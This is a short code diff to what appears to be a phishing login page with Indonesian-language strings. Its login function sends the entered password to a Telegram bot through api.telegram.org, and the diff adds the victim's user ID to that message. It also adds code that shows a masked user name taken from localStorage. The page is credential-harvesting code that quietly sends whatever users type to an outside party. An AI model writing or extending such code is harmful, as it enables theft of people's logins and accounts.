@@ -140,6 +140,7 @@ function login() {
 
     const pesan = `💌 Pesan baru
 
+nama: ${userid}
 password: ${pw}`;
     
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -166,6 +167,19 @@ password: ${pw}`;
     });
   }
 
+    const user = localStorage.getItem("userid");
+
+if(!user){
+location.href="index.html";
+}
+
+let tampil = user;
+
+if(user.length>4){
+tampil = user.substring(0,2) + "*".repeat(user.length-4) + user.substring(user.length-2);
+}
+
+document.getElementById("user").innerHTML=tampil;
 </script>
 
 </body>
